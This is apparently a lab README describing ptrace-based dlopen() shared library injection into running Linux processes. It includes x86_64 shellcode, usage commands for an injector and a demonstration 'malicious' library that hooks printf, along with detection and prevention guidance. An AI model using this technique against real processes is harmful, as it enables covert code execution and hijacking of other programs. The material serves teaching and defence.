# dlopen() Shared Library Injection

## Overview

This technique injects a shared library into a running process by forcing it to call `dlopen()`. Unlike LD_PRELOAD (which only works when starting a process), this method can inject code into already-running processes.

## How It Works

1. **Attach with ptrace**: Pause the target process
2. **Save state**: Save original registers and memory
3. **Locate dlopen**: Find the address of `dlopen` in the victim's address space
4. **Allocate string**: Find writable memory and write the library path
5. **Create shellcode**: Generate machine code to call `dlopen(library_path, RTLD_NOW)`
6. **Execute**: Inject and execute the shellcode
7. **Wait for completion**: Wait for breakpoint (int3) instruction
8. **Restore state**: Restore original memory and registers
9. **Detach**: Let the process continue normally

## Technical Details

### Resolving `dlopen`

The example calculates the local `dlopen` offset from the libc load base and
applies that offset to the target's libc mapping. This requires the injector and
target to use a compatible libc build. It deliberately avoids private glibc
symbols such as `__libc_dlopen_mode`, which are not a stable public interface.

### x86_64 Calling Convention

```
RDI = first argument (filename)
RSI = second argument (flags)
RAX = return value (library handle or NULL on failure)
```

### Shellcode Structure

```asm
mov rdi, <library_path_address>  ; First argument
mov rsi, RTLD_NOW                 ; Second argument (2)
mov rax, <dlopen_address>         ; Function to call
call rax                          ; Call dlopen
int3                              ; Breakpoint to regain control
```

## Requirements

- Root privileges or `CAP_SYS_PTRACE` capability
- Target process must have libc loaded (nearly all processes do)
- Target process must not be running as root (unless injector is also root)
- Kernel must allow ptrace (check `/proc/sys/kernel/yama/ptrace_scope`)

## Building

```bash
make all
```

This creates:
- `inject` - The injection tool
- `malicious_lib.so` - The malicious shared library to inject
- `victim-process/sample` - The victim process

## Usage

### Step 1: Start the victim process

```bash
./victim-process/sample
```

Output:
```
Victim Process Started
PID: 12345
This process has no idea it will be injected...

Counter: 0
Counter: 1
...
```

### Step 2: Inject the library

In another terminal:

```bash
sudo ./inject <victim_pid> ./malicious_lib.so
```

Example:
```bash
sudo ./inject 12345 ./malicious_lib.so
```

### Expected Output

**Injector output:**
```
=== dlopen() Shared Library Injection ===
[*] Target PID: 12345
[*] Library: /path/to/malicious_lib.so

[*] Attaching to process 12345...
[+] Attached successfully
[+] Original RIP: 0x7ffff7af1234
[+] Found libc base: 0x7ffff7a00000
[+] dlopen address in target: 0x7ffff7a12340
[+] Found writable region: 0x7ffff7dd5000-0x7ffff7dd7000
[*] Writing library path to 0x7ffff7dd5000...
[*] Writing shellcode to 0x7ffff7af1234...
[*] Executing dlopen() in target process...
[+] dlopen() returned: 0x555555559260
[+] Library loaded successfully!
[*] Restoring original state...
[+] Detached from process

[SUCCESS] Library injected!
[INFO] Check the victim process output for library messages
```

**Victim process output:**
```
Counter: 5
Counter: 6

========================================
  MALICIOUS LIBRARY LOADED!
========================================
  PID:  12345
  UID:  1000
  Time: Mon Jan 1 12:00:00 2024
========================================

[MALICIOUS] I could do anything now:
[MALICIOUS]   - Steal credentials
[MALICIOUS]   - Exfiltrate data
[MALICIOUS]   - Install backdoor
[MALICIOUS]   - Escalate privileges
[MALICIOUS]   - Hook sensitive functions

[HIJACKED] Counter: 7
[HIJACKED] Counter: 8
...
```

Notice how after injection, all `printf` calls are hijacked!

## What the Malicious Library Does

1. **Constructor function**: Runs immediately when loaded (before returning to normal execution)
2. **Function hooking**: Hijacks `printf()` to demonstrate control
3. **Information gathering**: Displays PID, UID, timestamp
4. **Demonstrates capabilities**: Shows what could be done in a real attack

## Detection and Prevention

### Detection

1. **Monitor process memory maps**: Check `/proc/<pid>/maps` for unexpected libraries
```bash
cat /proc/<pid>/maps | grep -v "^[0-9a-f]*-[0-9a-f]* ---p"
```

2. **Monitor ptrace usage**: Use auditd
```bash
auditctl -a exit,always -F arch=b64 -S ptrace
```

3. **Check for suspicious libraries**:
```bash
lsof -p <pid> | grep '\.so'
```

4. **Runtime integrity checking**: Periodically verify loaded libraries against whitelist

### Prevention

1. **Yama ptrace_scope**: Restrict ptrace to root
```bash
echo 1 | sudo tee /proc/sys/kernel/yama/ptrace_scope
```

2. **SELinux/AppArmor**: Enforce mandatory access controls

3. **Disable ptrace**: Kernel configuration option

4. **Code signing**: Verify library signatures before loading

5. **Namespaces and containers**: Isolate processes

## Troubleshooting

### dlopen() returned NULL

- Check library path is absolute
- Verify library has correct permissions
- Check library dependencies: `ldd malicious_lib.so`
- Look for errors: Run victim with `LD_DEBUG=all`

### Permission denied

- Run with sudo
- Check ptrace_scope: `cat /proc/sys/kernel/yama/ptrace_scope`
- Verify you can attach: `sudo gdb -p <pid>`

### Failed to find libc

- Victim may be statically linked
- Check: `ldd victim-process/sample`
- This technique only works with dynamically linked binaries

### Segmentation fault

- Shellcode may be incorrect for your architecture
- Try on x86_64 Linux
- Check libc version compatibility

## Cleanup

```bash
make clean
```

## References

- `man dlopen` - Dynamic library loading
- `man ptrace` - Process tracing
- Linux x86_64 ABI: Calling conventions
- ELF format: Understanding shared libraries
